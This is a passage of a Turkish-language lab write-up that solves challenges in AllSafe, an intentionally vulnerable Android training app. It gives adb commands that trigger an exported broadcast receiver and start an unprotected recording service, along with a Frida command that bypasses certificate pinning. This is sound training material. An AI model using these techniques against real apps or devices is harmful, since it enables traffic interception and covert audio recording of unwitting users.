+<p>Alınan broadcast içindeki not verisini sunucuya HTTP isteğiyle gönderiyor ve kullanıcıya bir bildirim gösteriyor.</p>
+
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="no">PS</span> <span class="nl">C:</span><span class="err">\</span><span class="nc">Users</span><span class="err">\</span><span class="nc">Neslihan</span><span class="o">&gt;</span> <span class="n">adb</span> <span class="n">shell</span> <span class="n">am</span> <span class="n">broadcast</span> <span class="o">-</span><span class="n">a</span> <span class="s">"infosecadventures.allsafe.action.PROCESS_NOTE"</span> <span class="o">--</span><span class="n">es</span> <span class="n">server</span> <span class="err">'</span><span class="mf">192.168</span><span class="o">.</span><span class="mf">16.101</span><span class="err">'</span> <span class="o">--</span><span class="n">es</span> <span class="n">note</span> <span class="err">'</span><span class="nc">Hello</span><span class="o">,</span><span class="nc">World</span><span class="err">'</span> <span class="o">--</span><span class="n">es</span> <span class="n">notification_message</span> <span class="err">'</span><span class="nc">Compromised</span><span class="err">'</span> <span class="o">-</span><span class="n">n</span> <span class="n">infosecadventures</span><span class="o">.</span><span class="na">allsafe</span><span class="o">/.</span><span class="na">challenges</span><span class="o">.</span><span class="na">NoteReceiver</span>
+</code></pre></div></div>
+
+<h2 id="certificate-pinning">Certificate Pinning</h2>
+
+<p>!image.png</p>
+
+<p>Sertifika pinleyip httpbin.org sitesine güvenli bir istek yapar.</p>
+
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">frida</span> <span class="o">-</span><span class="no">U</span> <span class="o">--</span><span class="n">codeshare</span> <span class="n">pcipolloni</span><span class="o">/</span><span class="n">universal</span><span class="o">-</span><span class="n">android</span><span class="o">-</span><span class="n">ssl</span><span class="o">-</span><span class="n">pinning</span><span class="o">-</span><span class="n">bypass</span><span class="o">-</span><span class="n">with</span><span class="o">-</span><span class="n">frida</span> <span class="o">-</span><span class="n">f</span> <span class="n">infosecadventures</span><span class="o">.</span><span class="na">allsafe</span> <span class="o">--</span><span class="n">no</span><span class="o">-</span><span class="n">pause</span>
+</code></pre></div></div>
+
+<p>Bu script HTTPS trafiğini kesmek ve ssl pinning’i atlatmak için kullanılır.</p>
+
+<h2 id="insecure-service">Insecure Service</h2>
+
+<p><img src="/assets/posts/allsafe-apk/image (23).png" width="500" /></p>
+
+<p><img src="/assets/posts/allsafe-apk/image (24).png" width="500" /></p>
+
+<p>Uygulamadaki butona tıklandığında servis başlatılıyor.</p>
+
+<p><img src="/assets/posts/allsafe-apk/image (25).png" width="500" /></p>
+
+<p>Ses kaydını başlatır; kaydı 10 saniyeyle sınırlar, kalite ve format ayarlarını yapar, dosya oluşturur, kayda başlar ve hata olursa loglar.</p>
+
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">private</span> <span class="nc">File</span> <span class="nf">getOutputFile</span><span class="o">()</span> <span class="o">{</span>
+        <span class="nc">SimpleDateFormat</span> <span class="n">dateFormat</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">SimpleDateFormat</span><span class="o">(</span><span class="s">"yyyyMMdd_HHmmssSSS"</span><span class="o">,</span> <span class="nc">Locale</span><span class="o">.</span><span class="na">US</span><span class="o">);</span>
+        <span class="nc">String</span> <span class="n">fullPath</span> <span class="o">=</span> <span class="nc">Environment</span><span class="o">.</span><span class="na">getExternalStoragePublicDirectory</span><span class="o">(</span><span class="nc">Environment</span><span class="o">.</span><span class="na">DIRECTORY_DOWNLOADS</span><span class="o">).</span><span class="na">getAbsolutePath</span><span class="o">()</span> <span class="o">+</span> <span class="s">"/allsafe_rec_"</span> <span class="o">+</span> <span class="n">dateFormat</span><span class="o">.</span><span class="na">format</span><span class="o">(</span><span class="k">new</span> <span class="nc">Date</span><span class="o">())</span> <span class="o">+</span> <span class="s">".mp3"</span><span class="o">;</span>
+        <span class="nc">Toast</span><span class="o">.</span><span class="na">makeText</span><span class="o">(</span><span class="n">getApplicationContext</span><span class="o">(),</span> <span class="s">"File: "</span> <span class="o">+</span> <span class="n">fullPath</span><span class="o">,</span> <span class="mi">0</span><span class="o">).</span><span class="na">show</span><span class="o">();</span>
+        <span class="k">return</span> <span class="k">new</span> <span class="nf">File</span><span class="o">(</span><span class="n">fullPath</span><span class="o">);</span>
+    <span class="o">}</span>
+</code></pre></div></div>
+
+<p>Dosya adı zaman damgasıyla oluşturup, <code class="language-plaintext highlighter-rouge">Downloads</code> klasörüne <code class="language-plaintext highlighter-rouge">.mp3</code> uzantılı dosya yolu verir ve bu yolu gösteren kısa bir bildirim (toast) çıkarır.</p>
+
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">adb</span> <span class="n">shell</span> <span class="n">am</span> <span class="n">startservice</span> <span class="n">infosecadventures</span><span class="o">.</span><span class="na">allsafe</span><span class="o">/.</span><span class="na">challenges</span><span class="o">.</span><span class="na">RecorderService</span>
+</code></pre></div></div>
+
+<p>Kaynak: <a href="https://github.com/t0thkr1s/allsafe-android">AllSafe Android</a></p>
+
+    </div>
+
+</article>
+        </main>
+
+    </div>
+
+    <footer>
+    © 2026 Neslihan Gürgen
+</footer>
+
+</body>
+</html>
